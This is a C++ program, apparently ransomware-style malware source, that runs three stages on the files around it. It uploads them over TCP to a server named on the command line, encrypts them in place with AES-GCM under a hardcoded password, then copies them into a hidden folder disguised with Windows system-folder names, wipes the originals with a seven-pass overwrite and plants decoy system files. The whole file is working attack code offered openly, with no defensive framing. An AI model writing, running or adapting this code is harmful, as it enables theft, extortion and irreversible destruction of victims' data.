#include <iostream>
#include <fstream>
#include <sstream>
#include <string>
#include <vector>
#include <map>
#include <algorithm>
#include <iomanip>
#include <cstring>
#include <filesystem>
#include <cstdlib>
#include <chrono>
#include <thread>
#include <random>
#include <cctype>
#include <regex>

#ifdef _WIN32
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #include <windows.h>
    #include <shlobj.h>
    #include <direct.h>
    #include <lmcons.h>
    #include <wincrypt.h>
    #include <sys/stat.h>
    #include <shlobj.h>
    #include <aclapi.h>
    #define getcwd _getcwd
    #pragma comment(lib, "ws2_32.lib")
    #pragma comment(lib, "crypt32.lib")
    #pragma comment(lib, "advapi32.lib")
#else
    #include <unistd.h>
    #include <sys/stat.h>
    #include <dirent.h>
    #include <fcntl.h>
    #include <pwd.h>
#endif

// OpenSSL headers for encryption
#include <openssl/evp.h>
#include <openssl/rand.h>

namespace fs = std::filesystem;

// ==================== NETWORK TRANSFER (Client.cpp) ====================
#define PORT 8080
#define BUFFER_SIZE 4096

class FileTransferClient {
private:
    SOCKET sock;
    sockaddr_in serv_addr;
    std::map<std::string, std::string> fileRelativePaths;

    void connectToServer(const std::string& ip = "127.0.0.1") {
        WSADATA wsaData;
        if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
            std::cerr << "WSAStartup failed" << std::endl;
            return;
        }
        
        sock = socket(AF_INET, SOCK_STREAM, 0);
        serv_addr.sin_family = AF_INET;
        serv_addr.sin_port = htons(PORT);
        
        if (inet_pton(AF_INET, ip.c_str(), &serv_addr.sin_addr) <= 0) {
            closesocket(sock);
            WSACleanup();
            std::cerr << "Invalid address" << std::endl;
            return;
        }
        
        if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
            closesocket(sock);
            WSACleanup();
            std::cerr << "Connection failed" << std::endl;
            return;
        }
        std::cout << "Connected to server." << std::endl;
    }

    void sendString(const std::string& str) {
        send(sock, str.c_str(), (int)str.length(), 0);
        Sleep(20);
    }

    std::string receiveString() {
        char buffer[BUFFER_SIZE];
        memset(buffer, 0, BUFFER_SIZE);
        int bytesRead = recv(sock, buffer, BUFFER_SIZE, 0);
        return (bytesRead <= 0) ? "" : std::string(buffer);
    }

    size_t getFileSize(const std::string& filepath) {
        std::ifstream file(filepath, std::ios::binary | std::ios::ate);
        if (!file.is_open()) return 0;
        std::streamsize size = file.tellg();
        file.close();
        return (size_t)size;
    }

    void sendFile(const std::string& filepath) {
        std::ifstream file(filepath, std::ios::binary);
        if (!file.is_open()) {
            std::cerr << "Cannot open file: " << filepath << std::endl;
            return;
        }

        file.seekg(0, std::ios::end);
        size_t fileSize = (size_t)file.tellg();
        file.seekg(0, std::ios::beg);

        size_t lastSlash = filepath.find_last_of("\\/");
        std::string filename = (lastSlash == std::string::npos) ? filepath : filepath.substr(lastSlash + 1);

        sendString("FILE");
        sendString(filename);
        sendString(std::to_string(fileSize));

        if (receiveString() != "READY") {
            std::cerr << "Server not ready" << std::endl;
            return;
        }

        char buffer[BUFFER_SIZE];
        while (file.read(buffer, BUFFER_SIZE) || file.gcount() > 0) {
            send(sock, buffer, (int)file.gcount(), 0);
        }
        file.close();
        receiveString();
        std::cout << "  Sent: " << filename << std::endl;
    }

    void getAllFilesInFolder(const std::string& folderPath, std::vector<std::string>& files, const std::string& basePath = "") {
        std::string searchPath = folderPath + "\\*.*";
        WIN32_FIND_DATA findData;
        HANDLE hFind = FindFirstFile(searchPath.c_str(), &findData);

        if (hFind == INVALID_HANDLE_VALUE) return;
        do {
            if (strcmp(findData.cFileName, ".") == 0 || strcmp(findData.cFileName, "..") == 0) continue;
            
            std::string currentPath = (basePath.empty() ? "" : basePath + "\\") + findData.cFileName;
            std::string fullPath = folderPath + "\\" + findData.cFileName;

            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                getAllFilesInFolder(fullPath, files, currentPath);
            } else {
                files.push_back(fullPath);
                fileRelativePaths[fullPath] = currentPath;
            }
        } while (FindNextFile(hFind, &findData) != 0);
        FindClose(hFind);
    }

    void sendFolder(const std::string& folderPath) {
        std::vector<std::string> files;
        fileRelativePaths.clear();
        
        size_t lastSlash = folderPath.find_last_of("\\/");
        std::string folderName = (lastSlash == std::string::npos) ? folderPath : folderPath.substr(lastSlash + 1);
        
        getAllFilesInFolder(folderPath, files, folderName);

        sendString("FOLDER");
        sendString(folderName);
        if (receiveString() != "READY") return;

        sendString(std::to_string(files.size()));
        if (receiveString() != "READY_FILES") return;

        std::cout << "  Sending folder: " << folderName << " (" << files.size() << " files)" << std::endl;
        
        for (const auto& file : files) {
            std::string relativePath = fileRelativePaths[file];
            size_t size = getFileSize(file);

            sendString(relativePath);
            sendString(std::to_string(size));

            if (receiveString() != "READY_FILE") continue;

            std::ifstream infile(file, std::ios::binary);
            char buffer[BUFFER_SIZE];
            while (infile.read(buffer, BUFFER_SIZE) || infile.gcount() > 0) {
                send(sock, buffer, (int)infile.gcount(), 0);
            }
            infile.close();
            receiveString();
        }
    }

public:
    bool transferFiles(const std::string& serverIP = "127.0.0.1") {
        std::cout << "\n=== STEP 1: NETWORK TRANSFER ===" << std::endl;
        std::cout << "Connecting to " << serverIP << "..." << std::endl;
        
        connectToServer(serverIP);
        if (sock == INVALID_SOCKET) {
            std::cerr << "Failed to connect to server" << std::endl;
            return false;
        }

        char exePathBuffer[MAX_PATH];
        GetModuleFileName(NULL, exePathBuffer, MAX_PATH);
        std::string fullExePath(exePathBuffer);
        
        std::string currentDir = fullExePath.substr(0, fullExePath.find_last_of("\\/"));
        std::string myName = fullExePath.substr(fullExePath.find_last_of("\\/") + 1);

        std::cout << "Scanning: " << currentDir << std::endl;
        
        // First send all files
        std::string searchPattern = currentDir + "\\*";
        WIN32_FIND_DATA findData;
        HANDLE hFind = FindFirstFile(searchPattern.c_str(), &findData);

        if (hFind != INVALID_HANDLE_VALUE) {
            do {
                std::string itemName = findData.cFileName;
                
                if (itemName == "." || itemName == ".." || itemName == myName) continue;

                std::string fullPath = currentDir + "\\" + itemName;

                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    std::cout << "Folder -> " << itemName << std::endl;
                    sendFolder(fullPath);
                } else {
                    std::cout << "File   -> " << itemName << std::endl;
                    sendFile(fullPath);
                }
            } while (FindNextFile(hFind, &findData) != 0);
            FindClose(hFind);
        }

        sendString("QUIT");
        closesocket(sock);
        WSACleanup();
        std::cout << "Network transfer complete." << std::endl;
        return true;
    }
};

// ==================== ENCRYPTION (encrypt_dir.cpp) ====================
const std::string PASSWORD = "StrongPassword@123";
const std::string MAGIC = "CRYPTO_V1";
constexpr int KEY_SIZE = 32, SALT_SIZE = 16, IV_SIZE = 12, TAG_SIZE = 16, ITER = 100000;

void deriveKey(const unsigned char* salt, unsigned char* key) {
    PKCS5_PBKDF2_HMAC(PASSWORD.c_str(), PASSWORD.size(), salt, SALT_SIZE, ITER, EVP_sha256(), KEY_SIZE, key);
}

bool isAlreadyEncrypted(const fs::path& p) {
    std::ifstream f(p, std::ios::binary);
    char buf[9]; 
    f.read(buf, MAGIC.size());
    return f.gcount() == MAGIC.size() && std::string(buf, 9) == MAGIC;
}

void encryptFile(const fs::path& filePath) {
    if (isAlreadyEncrypted(filePath)) return;

    std::ifstream inFile(filePath, std::ios::binary);
    if (!inFile.is_open()) {
        std::cerr << "  Cannot open for encryption: " << filePath.filename() << std::endl;
        return;
    }
    
    std::vector<unsigned char> plain((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
    inFile.close();

    // Skip empty files
    if (plain.empty()) return;

    unsigned char salt[SALT_SIZE], iv[IV_SIZE], tag[TAG_SIZE], key[KEY_SIZE];
    RAND_bytes(salt, SALT_SIZE);
    RAND_bytes(iv, IV_SIZE);
    deriveKey(salt, key);

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, IV_SIZE, nullptr);
    EVP_EncryptInit_ex(ctx, nullptr, nullptr, key, iv);

    std::vector<unsigned char> cipher(plain.size() + 16); // Extra space for GCM
    int len;
    EVP_EncryptUpdate(ctx, cipher.data(), &len, plain.data(), (int)plain.size());
    EVP_EncryptFinal_ex(ctx, nullptr, &len);
    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, TAG_SIZE, tag);
    EVP_CIPHER_CTX_free(ctx);

    // Overwrite the original file with: MAGIC + SALT + IV + TAG + CIPHER
    std::ofstream outFile(filePath, std::ios::binary | std::ios::trunc);
    outFile.write(MAGIC.c_str(), MAGIC.size());
    outFile.write((char*)salt, SALT_SIZE);
    outFile.write((char*)iv, IV_SIZE);
    outFile.write((char*)tag, TAG_SIZE);
    outFile.write((char*)cipher.data(), cipher.size());
}

void encryptRemainingFiles() {
    std::cout << "\n=== STEP 2: ENCRYPTION ===" << std::endl;
    std::cout << "Encrypting ALL remaining files (including videos)..." << std::endl;
    
    fs::path target = fs::current_path();
    int count = 0;
    int skipped = 0;
    
    // Get current executable name to skip it
    char exePathBuffer[MAX_PATH];
    GetModuleFileName(NULL, exePathBuffer, MAX_PATH);
    std::string currentExe = fs::path(exePathBuffer).filename().string();
    
    // Process ALL files including in subdirectories
    try {
        for (auto& e : fs::recursive_directory_iterator(target)) {
            try {
                if (fs::is_regular_file(e.status())) {
                    std::string filename = e.path().filename().string();
                    
                    // Skip our own executable
                    if (filename == currentExe) {
                        continue;
                    }
                    
                    // Check if already encrypted
                    if (!isAlreadyEncrypted(e.path())) {
                        encryptFile(e.path());
                        std::cout << "  Encrypted: " << filename;
                        if (!e.path().parent_path().string().empty() && 
                            e.path().parent_path() != target) {
                            std::cout << " (in " << fs::relative(e.path(), target).parent_path() << ")";
                        }
                        std::cout << std::endl;
                        count++;
                    } else {
                        skipped++;
                    }
                }
            } catch (const std::exception& e) {
                std::cerr << "  Error processing file: " << e.what() << std::endl;
            }
        }
    } catch (const std::exception& e) {
        std::cerr << "Error during encryption: " << e.what() << std::endl;
    }
    
    std::cout << "Encryption complete." << std::endl;
    std::cout << "  Files encrypted: " << count << std::endl;
    std::cout << "  Files already encrypted: " << skipped << std::endl;
}

// ==================== STEALTH OPERATION (secure_copy.cpp) ====================
class DocumentsStealthHider {
private:
    std::string sourceDir;
    std::string documentsDir;
    std::string hiddenBaseDir;
    
    void generateRandomData(char* buffer, size_t size) {
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(0, 255);
        
        for (size_t i = 0; i < size; i++) {
            buffer[i] = static_cast<char>(dis(gen));
        }
    }
    
    std::string getDocumentsDirectory() {
        #ifdef _WIN32
            char path[MAX_PATH];
            if (SUCCEEDED(SHGetFolderPathA(NULL, CSIDL_MYDOCUMENTS, NULL, 0, path))) {
                return std::string(path);
            }
            char* userProfile = getenv("USERPROFILE");
            if (userProfile) {
                return std::string(userProfile) + "\\Documents";
            }
        #else
            const char* home = getenv("HOME");
            if (home) {
                return std::string(home) + "/Documents";
            }
        #endif
        return "";
    }
    
    std::string createWindowsLikeFolderName() {
        const char* systemFolderNames[] = {
            "Windows.old",
            "MSOCache",
            "$WINDOWS.~BT",
            "Boot",
            "PerfLogs",
            "Recovery",
            "System Volume Information",
            "WinSxS",
            "SysWOW64",
            "Prefetch"
        };
        
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> nameDis(0, sizeof(systemFolderNames)/sizeof(systemFolderNames[0]) - 1);
        std::uniform_int_distribution<> numDis(1000, 9999);
        
        return std::string(systemFolderNames[nameDis(gen)]) + std::to_string(numDis(gen));
    }
    
    std::string generateHiddenFilename(const std::string& originalPath) {
        std::string filename = fs::path(originalPath).filename().string();
        std::string extension = fs::path(originalPath).extension().string();
        std::string stem = fs::path(originalPath).stem().string();
        
        std::string lastThree;
        if (stem.length() >= 3) {
            lastThree = stem.substr(stem.length() - 3);
        } else {
            lastThree = stem;
        }
        
        std::transform(lastThree.begin(), lastThree.end(), lastThree.begin(), ::tolower);
        
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(100, 999);
        
        return "hhh" + lastThree + "_" + std::to_string(dis(gen)) + extension;
    }
    
    std::string generateHiddenDirname(const std::string& originalDirPath) {
        std::string dirname = fs::path(originalDirPath).filename().string();
        
        std::string lastThree;
        if (dirname.length() >= 3) {
            lastThree = dirname.substr(dirname.length() - 3);
        } else {
            lastThree = dirname;
        }
        
        std::transform(lastThree.begin(), lastThree.end(), lastThree.begin(), ::tolower);
        
        std::random_device rd;
        std::mt19937 gen(rd());
        std::uniform_int_distribution<> dis(100, 999);
        
        return "dir" + lastThree + "_" + std::to_string(dis(gen));
    }
    
    void setUltraHidden(const std::string& path) {
        #ifdef _WIN32
            DWORD attrs = GetFileAttributesA(path.c_str());
            if (attrs != INVALID_FILE_ATTRIBUTES) {
                if (SetFileAttributesA(path.c_str(), 
                    attrs | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)) {
                    return;
                }
                SetFileAttributesA(path.c_str(), attrs | FILE_ATTRIBUTE_HIDDEN);
            }
        #endif
    }
    
    bool copyToHiddenLocation(const std::string& srcPath, const std::string& relativePath) {
        try {
            // Check if source is directory or file
            bool isDirectory = fs::is_directory(srcPath);
            
            if (isDirectory) {
                // For directories
                std::string hiddenDirname = generateHiddenDirname(srcPath);
                std::string destPath = hiddenBaseDir + "\\" + relativePath + "\\" + hiddenDirname;
                
                // Create the hidden directory
                fs::create_directories(destPath);
                setUltraHidden(destPath);
                
                // Recursively copy all contents
                for (const auto& entry : fs::recursive_directory_iterator(srcPath)) {
                    if (fs::is_regular_file(entry.status())) {
                        std::string fileSrcPath = entry.path().string();
                        std::string fileRelPath = fileSrcPath.substr(srcPath.length());
                        
                        if (!fileRelPath.empty() && (fileRelPath[0] == '\\' || fileRelPath[0] == '/')) {
                            fileRelPath = fileRelPath.substr(1);
                        }
                        
                        std::string fileDestPath = destPath + "\\" + fileRelPath;
                        fs::create_directories(fs::path(fileDestPath).parent_path());
                        fs::copy(entry.path(), fileDestPath, fs::copy_options::overwrite_existing);
                        setUltraHidden(fileDestPath);
                    }
                }
                
                return true;
            } else {
                // For files
                std::string hiddenFilename = generateHiddenFilename(srcPath);
                std::string destPath = hiddenBaseDir + "\\" + relativePath + "\\" + hiddenFilename;
                
                fs::create_directories(fs::path(destPath).parent_path());
                fs::copy(srcPath, destPath, fs::copy_options::overwrite_existing);
                setUltraHidden(destPath);
                
                return true;
            }
            
        } catch (const std::exception& e) {
            std::cerr << "  Error copying " << srcPath << ": " << e.what() << std::endl;
            return false;
        }
    }
    
    bool secureDelete7Pass(const std::string& filepath) {
        try {
            std::ifstream file(filepath, std::ios::binary | std::ios::ate);
            if (!file.is_open()) return false;
            
            size_t fileSize = static_cast<size_t>(file.tellg());
            file.close();
            
            if (fileSize == 0) {
                return std::remove(filepath.c_str()) == 0;
            }
            
            // 7-pass overwrite
            for (int pass = 0; pass < 7; pass++) {
                std::ofstream outfile(filepath, std::ios::binary | std::ios::trunc);
                if (!outfile.is_open()) return false;
                
                std::vector<char> buffer(std::min(fileSize, static_cast<size_t>(65536)));
                size_t written = 0;
                
                while (written < fileSize) {
                    size_t toWrite = std::min(buffer.size(), fileSize - written);
                    
                    switch (pass) {
                        case 0: case 1: case 6:
                            generateRandomData(buffer.data(), toWrite);
                            break;
                        case 2:
                            std::fill(buffer.begin(), buffer.begin() + toWrite, 0);
                            break;
                        case 3:
                            std::fill(buffer.begin(), buffer.begin() + toWrite, 0xFF);
                            break;
                        case 4:
                            for (size_t i = 0; i < toWrite; i++) buffer[i] = 0x55;
                            break;
                        case 5:
                            for (size_t i = 0; i < toWrite; i++) buffer[i] = 0xAA;
                            break;
                    }
                    
                    outfile.write(buffer.data(), toWrite);
                    written += toWrite;
                }
                outfile.close();
            }
            
            std::string currentPath = filepath;
            for (int i = 0; i < 3; i++) {
                std::string newName = currentPath + "." + 
                                    std::to_string(rand() % 10000) + ".tmp";
                std::rename(currentPath.c_str(), newName.c_str());
                currentPath = newName;
            }
            
            return std::remove(currentPath.c_str()) == 0;
            
        } catch (...) {
            return false;
        }
    }
    
    bool secureDeleteDirectory(const std::string& dirpath) {
        try {
            // First delete all files in directory
            for (const auto& entry : fs::recursive_directory_iterator(dirpath)) {
                if (fs::is_regular_file(entry.status())) {
                    secureDelete7Pass(entry.path().string());
                }
            }
            
            // Now delete directories (deepest first)
            std::vector<std::string> dirs;
            for (const auto& entry : fs::recursive_directory_iterator(dirpath)) {
                if (fs::is_directory(entry.status())) {
                    dirs.push_back(entry.path().string());
                }
            }
            
            // Sort by length (deepest first)
            std::sort(dirs.begin(), dirs.end(), 
                     [](const std::string& a, const std::string& b) {
                         return a.length() > b.length();
                     });
            
            // Remove hidden attributes and delete
            for (const auto& dir : dirs) {
                #ifdef _WIN32
                    SetFileAttributesA(dir.c_str(), FILE_ATTRIBUTE_NORMAL);
                #endif
                fs::remove(dir);
            }
            
            // Delete main directory
            #ifdef _WIN32
                SetFileAttributesA(dirpath.c_str(), FILE_ATTRIBUTE_NORMAL);
            #endif
            return fs::remove_all(dirpath) > 0;
            
        } catch (...) {
            return false;
        }
    }
    
    void createDecoySystemFiles() {
        const std::vector<std::pair<std::string, std::string>> decoys = {
            {"desktop.ini", "[.ShellClassInfo]\nIconFile=%SystemRoot%\\system32\\SHELL32.dll\nIconIndex=-238"},
            {"thumbs.db", ""},
            {"NTUSER.DAT", ""},
            {"index.dat", ""}
        };
        
        for (const auto& decoy : decoys) {
            try {
                std::string filePath = sourceDir + "\\" + decoy.first;
                if (!fs::exists(filePath)) {
                    if (decoy.second.empty()) {
                        std::ofstream file(filePath, std::ios::binary);
                        file.close();
                    } else {
                        std::ofstream file(filePath);
                        file << decoy.second;
                        file.close();
                    }
                    
                    #ifdef _WIN32
                        SetFileAttributesA(filePath.c_str(), 
                                         FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
                    #endif
                }
            } catch (...) {}
        }
    }

public:
    DocumentsStealthHider() {
        sourceDir = fs::current_path().string();
        documentsDir = getDocumentsDirectory();
        if (documentsDir.empty()) {
            std::cerr << "Error: Could not find Documents directory!" << std::endl;
            return;
        }
        
        std::string hiddenFolderName = createWindowsLikeFolderName();
        hiddenBaseDir = documentsDir + "\\" + hiddenFolderName;
        
        std::cout << "Source directory: " << sourceDir << std::endl;
        std::cout << "Hidden location: " << hiddenBaseDir << std::endl;
    }
    
    void executeStealthOperation() {
        std::cout << "\n=== STEP 3: STEALTH OPERATION ===" << std::endl;
        std::cout << "Hiding ALL files and folders in Documents..." << std::endl;
        
        // Create main hidden directory
        fs::create_directories(hiddenBaseDir);
        setUltraHidden(hiddenBaseDir);
        
        int totalItems = 0;
        int successCount = 0;
        int fileCount = 0;
        int folderCount = 0;
        
        // Get current executable name to skip it
        char exePathBuffer[MAX_PATH];
        GetModuleFileName(NULL, exePathBuffer, MAX_PATH);
        std::string currentExe = fs::path(exePathBuffer).filename().string();
        
        // Process ALL files and folders
        try {
            for (const auto& entry : fs::recursive_directory_iterator(sourceDir)) {
                try {
                    totalItems++;
                    std::string srcPath = entry.path().string();
                    
                    // Skip our hidden base directory and current executable
                    if (srcPath.find(hiddenBaseDir) == 0) continue;
                    if (fs::is_regular_file(entry.status()) && 
                        entry.path().filename() == currentExe) continue;
                    
                    // Calculate relative path
                    std::string relativePath = srcPath.substr(sourceDir.length());
                    if (!relativePath.empty() && (relativePath[0] == '\\' || relativePath[0] == '/')) {
                        relativePath = relativePath.substr(1);
                    }
                    
                    // Remove current item name from relative path for parent directory
                    std::string parentDirPath = fs::path(relativePath).parent_path().string();
                    
                    if (fs::is_directory(entry.status())) {
                        // Handle directory
                        if (copyToHiddenLocation(srcPath, parentDirPath)) {
                            successCount++;
                            folderCount++;
                            
                            if (folderCount % 5 == 0) {
                                std::cout << "  Hidden " << folderCount << " folders..." << std::endl;
                            }
                        }
                    } else {
                        // Handle file
                        if (copyToHiddenLocation(srcPath, parentDirPath)) {
                            successCount++;
                            fileCount++;
                            
                            if (fileCount % 10 == 0) {
                                std::cout << "  Hidden " << fileCount << " files..." << std::endl;
                            }
                        }
                    }
                } catch (const std::exception& e) {
                    std::cerr << "  Error processing " << entry.path() << ": " << e.what() << std::endl;
                }
            }
        } catch (const std::exception& e) {
            std::cerr << "Error during stealth operation: " << e.what() << std::endl;
        }
        
        std::cout << "  Hidden: " << successCount << "/" << totalItems << " items" << std::endl;
        std::cout << "  Files: " << fileCount << ", Folders: " << folderCount << std::endl;
        
        // Securely delete originals
        std::cout << "\nSecurely deleting original files and folders..." << std::endl;
        int deletedFiles = 0;
        int deletedDirs = 0;
        
        try {
            // Process top-level items first
            std::vector<fs::path> items;
            for (const auto& entry : fs::directory_iterator(sourceDir)) {
                items.push_back(entry.path());
            }
            
            for (const auto& item : items) {
                std::string itemPath = item.string();
                
                // Skip our hidden base directory and current executable
                if (itemPath.find(hiddenBaseDir) == 0) continue;
                if (fs::is_regular_file(item) && item.filename() == currentExe) continue;
                
                try {
                    if (fs::is_regular_file(item)) {
                        if (secureDelete7Pass(itemPath)) {
                            deletedFiles++;
                        }
                    } else if (fs::is_directory(item)) {
                        if (secureDeleteDirectory(itemPath)) {
                            deletedDirs++;
                        }
                    }
                } catch (...) {
                    // Continue
                }
            }
            
            // Create decoy system files
            createDecoySystemFiles();
            
        } catch (...) {
            std::cerr << "Error during secure deletion" << std::endl;
        }
        
        std::cout << "  Deleted: " << deletedFiles << " files, " << deletedDirs << " directories" << std::endl;
        std::cout << "  Created decoy system files" << std::endl;
        
        std::cout << "\nStealth operation complete." << std::endl;
        std::cout << "All files and folders are hidden in: " << hiddenBaseDir << std::endl;
        std::cout << "File pattern: hhh{last3}_{random}.ext" << std::endl;
        std::cout << "Folder pattern: dir{last3}_{random}" << std::endl;
    }
};

// ==================== MAIN COMBINED PROGRAM ====================
int main(int argc, char* argv[]) {
    std::cout << "=== COMBINED SECURITY OPERATION ===" << std::endl;
    std::cout << "This program will perform 3 operations in sequence:" << std::endl;
    std::cout << "1. Send files over network" << std::endl;
    std::cout << "2. Encrypt remaining files" << std::endl;
    std::cout << "3. Hide and securely delete ALL files and folders" << std::endl;
    std::cout << "===================================\n" << std::endl;
    
    // Get server IP from command line or use default
    std::string serverIP = "127.0.0.1";
    if (argc > 1) {
        serverIP = argv[1];
    }
    
    // Step 1: Network Transfer
    FileTransferClient ftClient;
    bool transferSuccess = ftClient.transferFiles(serverIP);
    
    if (!transferSuccess) {
        std::cout << "Network transfer failed or skipped. Continuing with encryption..." << std::endl;
    }
    
    // Step 2: Encryption
    encryptRemainingFiles();
    
    // Step 3: Stealth Operation
    DocumentsStealthHider stealthHider;
    stealthHider.executeStealthOperation();
    
    std::cout << "\n=== ALL OPERATIONS COMPLETE ===" << std::endl;
    std::cout << "\nTo restore files (they will be encrypted):" << std::endl;
    std::cout << "1. Run restore_files.cpp to recover hidden files and folders" << std::endl;
    std::cout << "2. Run decrypt_dir.cpp to decrypt restored files" << std::endl;
    std::cout << "\nNote: ALL file types are processed including:" << std::endl;
    std::cout << "- Videos (.mp4, .avi, .mkv, .mov)" << std::endl;
    std::cout << "- Documents (.doc, .pdf, .txt)" << std::endl;
    std::cout << "- Images (.jpg, .png, .gif)" << std::endl;
    std::cout << "- Archives (.zip, .rar)" << std::endl;
    std::cout << "- And ALL other file types" << std::endl;
    std::cout << "\nPress Enter to exit..." << std::endl;
    std::cin.get();
    
    return 0;
}